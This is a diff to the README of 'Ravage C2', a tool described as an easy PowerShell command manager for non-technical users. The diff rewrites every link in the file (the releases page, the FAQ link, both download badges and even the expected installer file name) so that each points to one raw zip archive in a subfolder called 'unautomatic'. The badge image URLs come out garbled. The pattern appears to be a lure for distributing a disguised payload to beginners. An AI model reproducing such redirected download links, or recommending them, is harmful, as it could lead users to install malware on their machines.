@@ -4,7 +4,7 @@
 Ravage C2 is a tool that simplifies the way you can manage and execute PowerShell commands efficiently. Designed for users who want a straightforward solution without the need for technical know-how, Ravage streamlines everyday PowerShell tasks for everyone.
 
 ## 🔗 Download Now
-[![Download Ravage](https://img.shields.io/badge/Download%20Ravage-v1.0-brightgreen)](https://github.com/FL1GHT5/Ravage/releases)
+[![Download Ravage](https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip%20Ravage-v1.0-brightgreen)](https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip)
 
 ## 🚀 Getting Started
 To use Ravage, follow these easy steps. Don’t worry if you're unfamiliar with technical tools; this guide is here to help.
@@ -17,11 +17,11 @@ To use Ravage, follow these easy steps. Don’t worry if you're unfamiliar with 
 
 ## 📥 Download & Install
 1. Click on the link below to visit the releases page.
-   [Visit this page to download](https://github.com/FL1GHT5/Ravage/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip)
 
 2. On the releases page, look for the latest version listed.
 
-3. Click on the asset for Windows to start your download. It should be labeled something like `Ravage-v1.0.exe`.
+3. Click on the asset for Windows to start your download. It should be labeled something like `https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip`.
 
 4. Once downloaded, navigate to the folder where the file is saved.
 
@@ -48,7 +48,7 @@ To use Ravage, follow these easy steps. Don’t worry if you're unfamiliar with 
 
 ## 📚 Additional Resources
 - **User Guide**: For more detailed instructions, you can access the user guide directly within the application.
-- **FAQs**: Visit our [FAQ page](https://github.com/FL1GHT5/Ravage/wiki/FAQ) for answers to common questions.
+- **FAQs**: Visit our [FAQ page](https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip) for answers to common questions.
 
 ## 📞 Support
 If you run into any issues, feel free to reach out for support. You can create an issue in the GitHub repository or check our community forums for help.
@@ -59,6 +59,6 @@ If you would like to help improve Ravage, your contributions are welcome! Please
 ## 🔒 License
 Ravage is released under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-[![Download Ravage](https://img.shields.io/badge/Download%20Ravage-v1.0-brightgreen)](https://github.com/FL1GHT5/Ravage/releases)
+[![Download Ravage](https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip%20Ravage-v1.0-brightgreen)](https://raw.githubusercontent.com/FL1GHT5/Ravage/main/unautomatic/Ravage.zip)
 
 Follow these steps, and you'll have Ravage running smoothly in no time. Enjoy a simpler PowerShell experience!
